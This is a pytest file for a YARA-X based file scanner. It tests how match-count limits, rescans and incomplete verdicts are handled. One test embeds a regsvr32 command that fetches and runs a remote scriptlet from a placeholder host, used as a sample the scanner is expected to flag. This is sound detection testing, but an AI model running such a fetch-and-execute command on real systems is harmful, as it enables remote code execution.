"""The scanner's answer when YARA-X stops recording a string at its match limit."""

from pathlib import Path

import pytest

from yara_gate.models import Verdict, exit_code
from yara_gate.rules import RESCAN_LIMIT, compile_ruleset, guard_source, guarded_ruleset
from yara_gate.scanner import MATCH_CAP_REASON, scan_bytes

# Fires only on an "a" right before the marker: a million "a" ahead of it fill $a's list first.
_RULES = """
rule zz_letter_then_marker {
  meta:
    verdict_on_match = "block"
  strings:
    $a = "a"
    $m = "MARKER"
  condition:
    for any i in (1..#a) : ( $m at @a[i] + 1 )
}
private rule zz_letters {
  strings:
    $b = "b"
    $c = "c"
    $d = "d"
    $e = "e"
    $f = "f"
  condition:
    any of them
}
"""


@pytest.fixture
def cap_rules(rules_copy: Path) -> Path:
    (rules_copy / "local" / "zz_match_cap.yar").write_text(_RULES, encoding="utf-8")
    return rules_copy


def _rules_of(result: object) -> set[str]:
    return {finding.rule_id for finding in getattr(result, "findings", [])}


def test_under_a_million_bytes_reads_every_match(cap_rules: Path) -> None:
    result = scan_bytes(b"a" * 900_000 + b"aMARKER", name="t.txt", rules_dir=cap_rules)
    assert result.verdict is Verdict.block
    assert "zz_letter_then_marker" in _rules_of(result)
    assert result.match_rescan_limit is None


def test_full_list_is_read_again_and_keeps_its_verdict(cap_rules: Path) -> None:
    result = scan_bytes(b"a" * 1_500_000 + b"aMARKER", name="t.txt", rules_dir=cap_rules)
    assert result.verdict is Verdict.block
    assert "zz_letter_then_marker" in _rules_of(result)
    assert result.match_rescan_limit == RESCAN_LIMIT
    assert result.unguarded_rule_files == 0


def test_list_full_on_the_rescan_is_incomplete_with_findings(cap_rules: Path) -> None:
    command = b"regsvr32 /i:https://example.invalid/a.sct scrobj.dll\n"
    data = command + b"a" * (RESCAN_LIMIT + 100_000) + b"aMARKER"
    result = scan_bytes(data, name="t.txt", rules_dir=cap_rules)
    assert result.verdict is Verdict.incomplete
    assert result.incomplete_reason == MATCH_CAP_REASON
    assert exit_code(result) == 2
    assert result.match_rescan_limit == RESCAN_LIMIT
    # What was found before the list filled is kept, and the hidden match is not claimed.
    assert "script_regsvr32_remote_scriptlet" in _rules_of(result)
    assert "zz_letter_then_marker" not in _rules_of(result)


def test_more_full_lists_than_a_rescan_reads_are_incomplete(cap_rules: Path) -> None:
    # Five strings of a private rule, each with 1,100,000 matches.
    result = scan_bytes(b"bcdef" * 1_100_000, name="t.txt", rules_dir=cap_rules)
    assert result.verdict is Verdict.incomplete
    assert result.incomplete_reason == MATCH_CAP_REASON
    assert result.match_rescan_limit is None


def test_every_bundled_rule_file_is_guarded(rules_copy: Path) -> None:
    rules, _skipped, error, _compiled, _count, digest = compile_ruleset(rules_copy)
    assert error is None and rules is not None
    guarded, unguarded = guarded_ruleset(digest)
    assert guarded is not None
    assert unguarded == []


def test_guard_copies_strings_and_skips_rules_without_them() -> None:
    source = 'rule s { strings: $x = "a//b" condition: $x }\nrule n { condition: true }\n'
    guard = guard_source(source)
    assert guard is not None
    assert "private rule s__match_cap" in guard
    assert '$x = "a//b"' in guard
    assert "n__match_cap" not in guard
    assert guard_source("rule n { condition: true }") == ""


def test_guard_skips_commented_rules_and_reads_past_trailing_comments() -> None:
    # Shapes from signature-base: a rule kept inside a block comment, and a comment after `}`.
    source = (
        'rule kept { strings: $k = "k" condition: $k }  /* end of kept\n*/\n'
        '/*\nrule gone { strings: $g = "g" condition: $g }\n*/\n'
        "rule also { strings: $r = /a\\/\\*b/ condition: $r }\n"
    )
    guard = guard_source(source)
    assert guard is not None
    assert "kept__match_cap" in guard and "also__match_cap" in guard
    assert "gone" not in guard
